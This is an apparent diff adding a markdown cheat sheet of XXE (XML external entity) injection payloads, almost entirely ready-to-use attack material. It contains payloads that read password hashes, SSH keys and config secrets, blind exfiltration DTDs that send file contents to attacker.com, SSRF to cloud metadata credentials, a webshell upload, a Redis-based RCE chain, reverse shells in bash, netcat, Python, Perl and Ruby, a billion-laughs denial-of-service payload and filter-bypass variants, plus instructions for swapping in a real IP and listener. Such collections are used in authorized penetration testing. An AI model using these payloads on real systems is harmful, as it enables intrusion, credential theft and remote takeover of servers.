@@ -1,0 +1,694 @@
+# Complete XXE (XML External Entity) Injection Payload Collection
+
+```xml
+<!-- =============================================================================
+     BASIC XXE DETECTION PAYLOADS
+     ============================================================================= -->
+
+<!-- Basic XXE Detection -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY xxe "XXE_TEST">]>
+<root>&xxe;</root>
+
+<!-- Basic XXE with SYSTEM -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<root>&xxe;</root>
+
+<!-- XXE Detection with Parameter Entity -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd"> %xxe;]>
+<root></root>
+
+<!-- =============================================================================
+     FILE RETRIEVAL PAYLOADS - LINUX
+     ============================================================================= -->
+
+<!-- Read /etc/passwd -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<root>&xxe;</root>
+
+<!-- Read /etc/shadow -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]>
+<root>&xxe;</root>
+
+<!-- Read /etc/hosts -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]>
+<root>&xxe;</root>
+
+<!-- Read SSH Private Key -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///root/.ssh/id_rsa">]>
+<root>&xxe;</root>
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///home/user/.ssh/id_rsa">]>
+<root>&xxe;</root>
+
+<!-- Read Web Application Config Files -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///var/www/html/config.php">]>
+<root>&xxe;</root>
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///var/www/html/.env">]>
+<root>&xxe;</root>
+
+<!-- Read Apache Configuration -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/apache2/apache2.conf">]>
+<root>&xxe;</root>
+
+<!-- Read Nginx Configuration -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/nginx/nginx.conf">]>
+<root>&xxe;</root>
+
+<!-- Read Database Configuration -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/mysql/my.cnf">]>
+<root>&xxe;</root>
+
+<!-- Read bash history -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///root/.bash_history">]>
+<root>&xxe;</root>
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///home/user/.bash_history">]>
+<root>&xxe;</root>
+
+<!-- Read proc files -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]>
+<root>&xxe;</root>
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/version">]>
+<root>&xxe;</root>
+
+<!-- =============================================================================
+     FILE RETRIEVAL PAYLOADS - WINDOWS
+     ============================================================================= -->
+
+<!-- Read Windows hosts file -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts">]>
+<root>&xxe;</root>
+
+<!-- Read Windows SAM file -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Windows/System32/config/SAM">]>
+<root>&xxe;</root>
+
+<!-- Read Windows boot.ini -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/boot.ini">]>
+<root>&xxe;</root>
+
+<!-- Read Windows win.ini -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]>
+<root>&xxe;</root>
+
+<!-- Read IIS web.config -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/inetpub/wwwroot/web.config">]>
+<root>&xxe;</root>
+
+<!-- =============================================================================
+     PHP WRAPPER PAYLOADS
+     ============================================================================= -->
+
+<!-- PHP Filter - Base64 Encode -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">]>
+<root>&xxe;</root>
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]>
+<root>&xxe;</root>
+
+<!-- PHP Filter - Multiple Conversions -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode|convert.base64-decode/resource=/etc/passwd">]>
+<root>&xxe;</root>
+
+<!-- PHP Input Stream -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://input">]>
+<root>&xxe;</root>
+
+<!-- PHP Expect Wrapper (if enabled) -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]>
+<root>&xxe;</root>
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://whoami">]>
+<root>&xxe;</root>
+
+<!-- =============================================================================
+     ERROR-BASED XXE TESTING
+     ============================================================================= -->
+
+<!-- Trigger XML Parser Error -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///nonexistent">]>
+<root>&xxe;</root>
+
+<!-- Error-based File Disclosure -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<root>
+  <name>&xxe;</name>
+</root>
+
+<!-- Error-based with Invalid Entity -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%xxe;'>">%eval;%error;]>
+<root></root>
+
+<!-- =============================================================================
+     BLIND XXE - OUT OF BAND (OOB) TESTING
+     ============================================================================= -->
+
+<!-- Basic OOB XXE with HTTP -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/xxe">]>
+<root>&xxe;</root>
+
+<!-- OOB XXE with FTP -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "ftp://attacker.com/xxe">]>
+<root>&xxe;</root>
+
+<!-- OOB XXE with Parameter Entity -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]>
+<root></root>
+
+<!-- External DTD for Blind XXE -->
+<!-- Host this as evil.dtd on attacker.com -->
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker.com/?data=%file;'>">
+%eval;
+%exfiltrate;
+
+<!-- Complete Blind XXE with External DTD -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]>
+<root></root>
+
+<!-- OOB XXE with DNS Exfiltration -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd"> %dtd;]>
+<root></root>
+
+<!-- evil.dtd for DNS exfiltration -->
+<!ENTITY % all "<!ENTITY send SYSTEM 'http://%file;.attacker.com/'>">
+%all;
+
+<!-- =============================================================================
+     ADVANCED BLIND XXE PAYLOADS
+     ============================================================================= -->
+
+<!-- Blind XXE with Error-based Exfiltration -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % dtd SYSTEM "http://attacker.com/error.dtd"> %dtd;]>
+<root></root>
+
+<!-- error.dtd -->
+<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
+%eval;
+%error;
+
+<!-- Blind XXE with Parameter Entity Trick -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE data [
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % dtd SYSTEM "http://attacker.com/xxe.dtd">
+%dtd;
+]>
+<data>&send;</data>
+
+<!-- xxe.dtd -->
+<!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker.com/?%file;'>">
+%all;
+
+<!-- =============================================================================
+     XXE WITH SOAP PAYLOADS
+     ============================================================================= -->
+
+<!-- SOAP XXE -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+  <soap:Body>
+    <foo>&xxe;</foo>
+  </soap:Body>
+</soap:Envelope>
+
+<!-- SOAP Blind XXE -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]>
+<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+  <soap:Body>
+    <foo>test</foo>
+  </soap:Body>
+</soap:Envelope>
+
+<!-- =============================================================================
+     XXE WITH SVG PAYLOADS
+     ============================================================================= -->
+
+<!-- SVG XXE File Read -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<svg xmlns="http://www.w3.org/2000/svg">
+  <text x="0" y="16">&xxe;</text>
+</svg>
+
+<!-- SVG Blind XXE -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]>
+<svg xmlns="http://www.w3.org/2000/svg">
+  <text x="0" y="16">test</text>
+</svg>
+
+<!-- =============================================================================
+     XXE WITH OFFICE DOCUMENTS (DOCX, XLSX, PPTX)
+     ============================================================================= -->
+
+<!-- DOCX XXE (in word/document.xml) -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
+  <w:body>
+    <w:p>
+      <w:r>
+        <w:t>&xxe;</w:t>
+      </w:r>
+    </w:p>
+  </w:body>
+</w:document>
+
+<!-- XLSX XXE (in xl/workbook.xml) -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
+  <sheets>
+    <sheet name="Sheet1" sheetId="1" r:id="&xxe;"/>
+  </sheets>
+</workbook>
+
+<!-- =============================================================================
+     XXE TO RCE PAYLOADS
+     ============================================================================= -->
+
+<!-- XXE to RCE via PHP Expect (if enabled) -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]>
+<root>&xxe;</root>
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://whoami">]>
+<root>&xxe;</root>
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://ls -la">]>
+<root>&xxe;</root>
+
+<!-- XXE to RCE via PHP Expect - Reverse Shell -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://bash -c 'bash -i >& /dev/tcp/10.10.14.1/4444 0>&1'">]>
+<root>&xxe;</root>
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://nc -e /bin/sh 10.10.14.1 4444">]>
+<root>&xxe;</root>
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.1\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'">]>
+<root>&xxe;</root>
+
+<!-- XXE to RCE via JAR Protocol (Java) -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "jar:http://attacker.com/evil.jar!/">]>
+<root>&xxe;</root>
+
+<!-- XXE to RCE via External DTD with Command Execution -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/rce.dtd"> %xxe;]>
+<root></root>
+
+<!-- rce.dtd (hosted on attacker server) -->
+<!ENTITY % cmd SYSTEM "expect://id">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?%cmd;'>">
+%eval;
+%exfil;
+
+<!-- XXE to RCE via File Upload and Include -->
+<!-- Step 1: Upload webshell via XXE -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/write=convert.base64-decode/resource=/var/www/html/shell.php">]>
+<root>PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+</root>
+
+<!-- Base64 of: <?php system($_GET['cmd']); ?> -->
+
+<!-- Step 2: Access the uploaded shell -->
+<!-- http://target.com/shell.php?cmd=id -->
+
+<!-- XXE to RCE via PHAR Deserialization (PHP) -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "phar://uploads/exploit.phar/test.txt">]>
+<root>&xxe;</root>
+
+<!-- XXE to RCE via File Write (if possible) -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///var/www/html/shell.php">]>
+<root><?php system($_GET['cmd']); ?></root>
+
+<!-- =============================================================================
+     XXE WITH BILLION LAUGHS ATTACK (DOS)
+     ============================================================================= -->
+
+<!-- Billion Laughs Attack -->
+<?xml version="1.0"?>
+<!DOCTYPE lolz [
+<!ENTITY lol "lol">
+<!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+<!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
+<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
+<!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
+<!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
+<!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
+<!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
+<!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
+]>
+<lolz>&lol9;</lolz>
+
+<!-- =============================================================================
+     XXE BYPASSING WAF/FILTERS
+     ============================================================================= -->
+
+<!-- UTF-16 Encoding -->
+<?xml version="1.0" encoding="UTF-16"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<root>&xxe;</root>
+
+<!-- UTF-7 Encoding (if supported) -->
+<?xml version="1.0" encoding="UTF-7"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<root>&xxe;</root>
+
+<!-- Using CDATA -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<root><![CDATA[&xxe;]]></root>
+
+<!-- Multiple Encoding -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///%65%74%63/%70%61%73%73%77%64">]>
+<root>&xxe;</root>
+
+<!-- Case Variation -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "FiLe:///etc/passwd">]>
+<root>&xxe;</root>
+
+<!-- Using Parameter Entities -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+<!ENTITY % param1 "<!ENTITY xxe SYSTEM 'file:///etc/passwd'>">
+%param1;
+]>
+<root>&xxe;</root>
+
+<!-- =============================================================================
+     XXE WITH DIFFERENT PROTOCOLS
+     ============================================================================= -->
+
+<!-- HTTP Protocol -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/file">]>
+<root>&xxe;</root>
+
+<!-- FTP Protocol -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "ftp://attacker.com/file">]>
+<root>&xxe;</root>
+
+<!-- HTTPS Protocol -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "https://attacker.com/file">]>
+<root>&xxe;</root>
+
+<!-- File Protocol -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<root>&xxe;</root>
+
+<!-- Data Protocol -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "data:text/plain,test">]>
+<root>&xxe;</root>
+
+<!-- Gopher Protocol (if supported) -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "gopher://127.0.0.1:6379/_INFO">]>
+<root>&xxe;</root>
+
+<!-- =============================================================================
+     XXE DATA EXFILTRATION TECHNIQUES
+     ============================================================================= -->
+
+<!-- HTTP GET Parameter Exfiltration -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % dtd SYSTEM "http://attacker.com/exfil.dtd"> %dtd;]>
+<root></root>
+
+<!-- exfil.dtd -->
+<!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker.com/?data=%file;'>">
+%all;
+
+<!-- HTTP POST Data Exfiltration -->
+<!-- Requires more complex server-side handling -->
+
+<!-- DNS Exfiltration -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/hostname"><!ENTITY % dtd SYSTEM "http://attacker.com/dns.dtd"> %dtd;]>
+<root></root>
+
+<!-- dns.dtd -->
+<!ENTITY % all "<!ENTITY send SYSTEM 'http://%file;.attacker.com/'>">
+%all;
+
+<!-- FTP Exfiltration -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % dtd SYSTEM "http://attacker.com/ftp.dtd"> %dtd;]>
+<root></root>
+
+<!-- ftp.dtd -->
+<!ENTITY % all "<!ENTITY send SYSTEM 'ftp://attacker.com:21/%file;'>">
+%all;
+
+<!-- =============================================================================
+     XXE CHAINED WITH OTHER VULNERABILITIES
+     ============================================================================= -->
+
+<!-- XXE + SSRF -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:8080/admin">]>
+<root>&xxe;</root>
+
+<!-- XXE + SSRF to Cloud Metadata -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">]>
+<root>&xxe;</root>
+
+<!-- XXE + SSRF to Internal Services -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:6379/">]>
+<root>&xxe;</root>
+
+<!-- XXE + File Upload -->
+<!-- Upload XML with XXE payload as file upload -->
+
+<!-- XXE + XSS -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<root><script>alert(&xxe;)</script></root>
+
+<!-- =============================================================================
+     TESTING FOR XXE - METHODOLOGY
+     ============================================================================= -->
+
+<!-- Step 1: Test for XML Processing -->
+<?xml version="1.0" encoding="UTF-8"?>
+<root>
+  <test>value</test>
+</root>
+
+<!-- Step 2: Test for Entity Support -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY test "entity_value">]>
+<root>&test;</root>
+
+<!-- Step 3: Test for External Entity -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/test">]>
+<root>&xxe;</root>
+
+<!-- Step 4: Test for File Access -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<root>&xxe;</root>
+
+<!-- Step 5: Test for Blind XXE -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]>
+<root></root>
+
+<!-- =============================================================================
+     XXE IN DIFFERENT CONTEXTS
+     ============================================================================= -->
+
+<!-- XXE in JSON (via XML conversion) -->
+{"root": {"xxe": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>"}}
+
+<!-- XXE in REST API -->
+POST /api/upload HTTP/1.1
+Content-Type: application/xml
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<data>&xxe;</data>
+
+<!-- XXE in RSS/Atom Feeds -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE rss [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<rss version="2.0">
+  <channel>
+    <title>&xxe;</title>
+  </channel>
+</rss>
+
+<!-- =============================================================================
+     AUTOMATED XXE DETECTION & EXPLOITATION
+     ============================================================================= -->
+
+# Using XXEinjector
+python3 XXEinjector.py --host=10.10.14.1 --httpport=8000 --file=/tmp/xxe.xml --path=/etc/passwd --oob=http
+
+# Using Burp Suite Collaborator
+# Replace attacker.com with Burp Collaborator URL
+
+<!-- =============================================================================
+     LISTENER SETUP FOR XXE
+     ============================================================================= -->
+
+# Python HTTP Server
+python3 -m http.server 8000
+
+# Netcat Listener
+nc -lvnp 8000
+
+# FTP Server (for blind XXE)
+python3 -m pyftpdlib -p 21 -w
+
+# Custom Python Server for XXE
+python3 -c "
+import http.server
+import urllib.parse
+class XXEHandler(http.server.BaseHTTPRequestHandler):
+    def do_GET(self):
+        print(f'XXE Data: {urllib.parse.unquote(self.path)}')
+        self.send_response(200)
+        self.end_headers()
+    def do_POST(self):
+        content_length = int(self.headers['Content-Length'])
+        post_data = self.rfile.read(content_length)
+        print(f'XXE Data (POST): {post_data.decode()}')
+        self.send_response(200)
+        self.end_headers()
+server = http.server.HTTPServer(('0.0.0.0', 8000), XXEHandler)
+server.serve_forever()
+"
+
+<!-- =============================================================================
+     XXE TO RCE - COMPLETE ATTACK CHAINS
+     ============================================================================= -->
+
+<!-- Chain 1: XXE -> File Write -> RCE -->
+<!-- Step 1: Write webshell using XXE -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/write=convert.base64-decode/resource=/var/www/html/shell.php">]>
+<root>PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+</root>
+
+<!-- Step 2: Access shell and execute commands -->
+<!-- http://target.com/shell.php?cmd=bash -c "bash -i >& /dev/tcp/10.10.14.1/4444 0>&1" -->
+
+<!-- Chain 2: XXE -> PHP Expect -> RCE -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://bash -c 'bash -i >& /dev/tcp/10.10.14.1/4444 0>&1'">]>
+<root>&xxe;</root>
+
+<!-- Chain 3: XXE -> SSRF -> RCE (via Redis) -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:6379/%0d%0a*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$56%0d%0a%0d%0a%0a<?php system($_GET['cmd']); ?>%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$13%0d%0a/var/www/html%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$9%0d%0ashell.php%0d%0a*1%0d%0a$4%0d%0asave%0d%0a">]>
+<root>&xxe;</root>
+
+<!-- Chain 4: XXE -> JAR Upload -> RCE (Java) -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "jar:http://attacker.com/evil.jar!/exploit.class">]>
+<root>&xxe;</root>
+
+<!-- =============================================================================
+     REVERSE SHELLS VIA XXE
+     ============================================================================= -->
+
+<!-- Bash Reverse Shell via XXE Expect -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://bash -c 'bash -i >& /dev/tcp/10.10.14.1/4444 0>&1'">]>
+<root>&xxe;</root>
+
+<!-- Python Reverse Shell via XXE Expect -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.1\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'">]>
+<root>&xxe;</root>
+
+<!-- Netcat Reverse Shell via XXE Expect -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://nc -e /bin/sh 10.10.14.1 4444">]>
+<root>&xxe;</root>
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.1 4444 >/tmp/f">]>
+<root>&xxe;</root>
+
+<!-- Perl Reverse Shell via XXE Expect -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://perl -e 'use Socket;$i=\"10.10.14.1\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'">]>
+<root>&xxe;</root>
+
+<!-- Ruby Reverse Shell via XXE Expect -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://ruby -rsocket -e'f=TCPSocket.open(\"10.10.14.1\",4444).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'">]>
+<root>&xxe;</root>
+```
+
+**Usage Instructions:**
+1. Replace `attacker.com` and `10.10.14.1` with your actual domain/IP
+2. Replace port `4444` with your listening port
+3. Set up appropriate listeners before executing RCE payloads
+4. For blind XXE, host the external DTD file on your server
+5. Always test with proper authorization
+6. Start with basic file read before attempting RCE
+7. Monitor server logs for successful XXE callbacks
+
+**Note:** Many XXE to RCE techniques require specific conditions like PHP expect wrapper being enabled, writable web directories, or specific vulnerable Java configurations.
